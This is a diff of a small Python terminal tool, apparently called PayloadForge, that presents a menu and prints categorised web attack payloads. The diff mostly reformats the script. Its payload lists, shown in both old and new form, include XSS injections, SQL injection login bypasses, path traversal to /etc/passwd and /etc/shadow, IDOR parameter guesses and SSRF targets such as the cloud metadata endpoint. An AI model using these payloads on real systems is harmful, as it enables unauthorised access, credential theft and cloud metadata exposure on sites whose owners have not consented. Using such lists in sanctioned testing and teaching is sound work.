@@ -3,7 +3,6 @@
 import os
 import time
 
-# Colors
 CYAN = '\033[96m'
 GREEN = '\033[92m'
 RED = '\033[91m'
@@ -15,20 +14,21 @@ def clear():
     os.system('clear' if os.name == 'posix' else 'cls')
 
 def banner():
-    print(f"""{MAGENTA}
-  ██████╗ ██╗   ██╗██████╗ ██████╗  █████╗ ██╗   ██╗███████╗ ██████╗ 
-  ██╔══██╗██║   ██║██╔══██╗██╔══██╗██╔══██╗╚██╗ ██╔╝██╔════╝██╔═══██╗
-  ██████╔╝██║   ██║██████╔╝██████╔╝███████║ ╚████╔╝ █████╗  ██║   ██║
-  ██╔═══╝ ██║   ██║██╔═══╝ ██╔═══╝ ██╔══██║  ╚██╔╝  ██╔══╝  ██║   ██║
-  ██║     ╚██████╔╝██║     ██║     ██║  ██║   ██║   ███████╗╚██████╔╝
-  ╚═╝      ╚═════╝ ╚═╝     ╚═╝     ╚═╝  ╚═╝   ╚═╝   ╚══════╝ ╚═════╝ 
-           {CYAN}PayloadForge v2 | Cyber Offensive Toolkit{RESET}
-         {YELLOW}By Karndeep Baror | @karndeepbaror (TG/IG){RESET}
-        {GREEN}Stay Ethical, Hack Strong 🇮🇳  By KK ⌷{RESET}
+    print(f"""{RED}
+██████╗  █████╗ ██╗   ██╗██╗      ██████╗ ██╗   ██╗     ███████╗ ██████╗ ██████╗  ██████╗  ███████╗
+██╔══██╗██╔══██╗╚██╗ ██╔╝██║     ██╔═══██╗██║   ██║     ██╔════╝██╔═══██╗██╔══██╗██╔═══██╗ ██╔════╝
+██████╔╝███████║ ╚████╔╝ ██║     ██║   ██║██║   ██║     █████╗  ██║   ██║██████╔╝██║   ██║ █████╗  
+██╔═══╝ ██╔══██║  ╚██╔╝  ██║     ██║   ██║██║   ██║     ██╔══╝  ██║   ██║██╔═══╝ ██║   ██║ ██╔══╝  
+██║     ██║  ██║   ██║   ███████╗╚██████╔╝╚██████╔╝     ██║     ╚██████╔╝██║     ╚██████╔╝ ███████╗
+╚═╝     ╚═╝  ╚═╝   ╚═╝   ╚══════╝ ╚═════╝  ╚═════╝      ╚═╝      ╚═════╝ ╚═╝      ╚═════╝  ╚══════╝
+{CYAN}                                PayloadForge v2 | Cyber Offensive Toolkit
+{YELLOW}                           By Karndeep Baror | @karndeepbaror (TG/IG)
+{GREEN}                          Stay Ethical , Hack Strong 🇮🇳  By KK ⌷
+{RESET}
 """)
 
 def animation():
-    for i in range(3):
+    for _ in range(2):
         for dots in ['.', '..', '...']:
             clear()
             print(f"{CYAN}[🛰️] Initializing PayloadForge{dots}{RESET}")
@@ -42,38 +42,11 @@ def ctrl_c_handler():
     exit()
 
 payloads = {
-    "XSS": [
-        "<script>alert('XSS')</script>",
-        "\"><script>alert(1)</script>",
-        "<img src=x onerror=alert(1)>",
-        "<svg/onload=alert('XSS')>",
-        "<iframe src='javascript:alert(1)'></iframe>"
-    ],
-    "SQLi": [
-        "' OR '1'='1",
-        "admin' -- ",
-        "\" OR \"\"=\"",
-        "' OR SLEEP(5)--+"
-    ],
-    "LFI": [
-        "../../../../../../etc/passwd",
-        "../../../etc/passwd%00",
-        "/etc/passwd",
-        "../../../../../etc/shadow"
-    ],
-    "IDOR": [
-        "?id=1",
-        "?user=1001",
-        "?account_id=2002",
-        "?doc=invoice_123.pdf",
-        "?file=userdata_007.json"
-    ],
-    "SSRF": [
-        "http://127.0.0.1",
-        "http://localhost",
-        "http://0.0.0.0",
-        "http://169.254.169.254/latest/meta-data/"
-    ]
+    "XSS": ["<script>alert('XSS')</script>", "\"><script>alert(1)</script>", "<img src=x onerror=alert(1)>", "<svg/onload=alert('XSS')>", "<iframe src='javascript:alert(1)'></iframe>"],
+    "SQLi": ["' OR '1'='1", "admin' -- ", "\" OR \"\"=\"", "' OR SLEEP(5)--+"],
+    "LFI": ["../../../../../../etc/passwd", "../../../etc/passwd%00", "/etc/passwd", "../../../../../etc/shadow"],
+    "IDOR": ["?id=1", "?user=1001", "?account_id=2002", "?doc=invoice_123.pdf", "?file=userdata_007.json"],
+    "SSRF": ["http://127.0.0.1", "http://localhost", "http://0.0.0.0", "http://169.254.169.254/latest/meta-data/"]
 }
 
 def print_payloads(category):
@@ -98,18 +71,12 @@ def main_menu():
         print(f"{GREEN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━{RESET}")
         choice = input(f"{YELLOW}Select Option (1-6): {RESET}").strip()
 
-        if choice == '1':
-            print_payloads("XSS")
-        elif choice == '2':
-            print_payloads("SQLi")
-        elif choice == '3':
-            print_payloads("LFI")
-        elif choice == '4':
-            print_payloads("IDOR")
-        elif choice == '5':
-            print_payloads("SSRF")
-        elif choice == '6':
-            ctrl_c_handler()
+        if choice == '1': print_payloads("XSS")
+        elif choice == '2': print_payloads("SQLi")
+        elif choice == '3': print_payloads("LFI")
+        elif choice == '4': print_payloads("IDOR")
+        elif choice == '5': print_payloads("SSRF")
+        elif choice == '6': ctrl_c_handler()
         else:
             print(f"{RED}Invalid Option! Try again.{RESET}")
             time.sleep(1)
